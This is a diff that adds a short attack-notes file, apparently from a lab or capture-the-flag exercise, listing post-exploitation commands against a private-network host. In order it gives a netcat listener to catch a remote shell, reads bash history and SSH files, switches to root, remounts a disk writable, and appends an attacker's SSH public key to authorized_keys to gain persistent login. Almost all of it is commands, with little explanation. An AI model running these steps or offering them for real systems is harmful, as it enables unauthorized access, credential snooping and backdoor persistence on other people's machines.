@@ -1,0 +1,41 @@
+~~~ Mounted Volumes ~~~
+
+nc -lvp 8080 # Get remote shell connection
+
+mount # check mounted volumes
+
+ls -alF /home/ubuntu # check default user home directory
+
+cat /home/ubuntu/.bash_history # check history of user commmands
+
+sudo su # switch to root
+
+ls -alF /home/ubuntu/.ssh/ # look for keys and other SSH information
+
+cat /home/ubuntu/.ssh/authorized_keys # read authorized keys
+
+echo "hi" >> /home/ubuntu/.ssh/authorized_keys # check if authorized_keys is writeable
+
+mount -o remount,rw /dev/xvda1 /home/ubuntu # mount disk with write permission
+
+echo "hi" >> /home/ubuntu/.ssh/authorized_keys # test write
+
+cat  /home/ubuntu/.ssh/authorized_keys # check if write worked
+
+~~~ Create SSH key locally ~~~
+
+sudo su -
+
+cd ~/.ssh/
+
+ssh-keygen
+
+ssti_key
+
+~~~ Gain Remote SSH Access ~~~
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmxR2IVFAq2J/fw//GKile0+njDOZexDFxj9PpEa646wBnc8I0dzS7tyhnsLNiKGcqN+vVyAccvpMyQkKpDcIMvyFeR1yh+1RsDCVnvNxZZtwbByfNGSAeO1fr2Cp3dl/avILVR0A/1cZ4xPFCAhqVCopdYMAHqg1mtPnlNmv14vAkr2mgpmLDu0C6kb/o0ukrP+3KjSjY6VA+VN9zMqk5PpadgD/bnmme83odO3LIpqg2nxFF75D5Ei9kAV6CeG2rPm7jFsd3UGFfjNwlGF0euE/IFPmy+/5wZzl0sqX4N76lQfQ6PWFXXfuB6IsQ7FP9yRYQ0RkJk8cJoh996ujd root@ip-10-0-1-226" >> /home/ubuntu/.ssh/authorized_keys # add new ssh key to authorized_keys
+
+cat  /home/ubuntu/.ssh/authorized_keys # checked for newly added key
+
+ssh -i ssti_key ubuntu@10.0.2.39 # connect to target
